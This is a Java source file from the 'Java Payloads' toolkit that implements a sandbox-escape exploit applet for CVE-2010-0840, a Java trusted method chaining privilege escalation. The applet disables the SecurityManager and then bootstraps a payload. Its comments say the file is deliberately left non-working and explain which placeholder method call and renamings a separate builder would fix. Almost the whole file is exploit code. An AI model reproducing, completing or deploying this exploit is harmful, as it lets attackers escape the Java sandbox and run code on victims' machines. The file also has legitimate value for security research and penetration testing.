/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

/*
 * Sun Java Trusted Method Chaining Privilige Escalation 
 * (CVE-2010-0840) based on 
 * <http://slightlyrandombrokenthoughts.blogspot.com/2010/04/java-trusted-method-chaining-cve-2010.html>
 * 
 * This version does not work out of the box: see line 91 for how to reenable it.
 */

package javapayload.exploit;

import java.beans.Expression;
import java.util.*;
import javapayload.loader.AppletLoader;
import javax.swing.JList;

public class CVE_2010_0840 extends AppletLoader {

	public void init() {
		final HashSet entrySet = new HashSet();
		entrySet.add(new MyExpression());
		add(new JList(new Object[] { new MyAbstractMap(entrySet), this }));
		repaint();
	}

	public String toString() {
		if (getComponentCount() == 1) {
			try {
				bootstrap();
				removeAll();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
		return super.toString();
	}

	public static class MyAbstractMap extends AbstractMap {

		private final Set entrySet;

		public MyAbstractMap(Set entrySet) {
			this.entrySet = entrySet;
		}

		public Set entrySet() {
			return entrySet;
		}
	}
	
	// CVE_2010_0840_AppletJarBuilder will add the implements clause
	public static class MyExpression extends Expression /*implements Map.Entry*/ {

		public MyExpression() {
			// you will have to change the line below so that it will
			// call the right method we want to call to disable security
			// (there is no method called "disableSecurity" in SecurityManager)
			super(SecurityManager.class, "disableSecurity", new Object[] { null });
		}

		public Object getKey() {
			return null;
		}

		// CVE_2010_0840_AppletJarBuilder will rename this method
		public Object setV/*alue*/(Object value) {
			return null;
		}
	}
}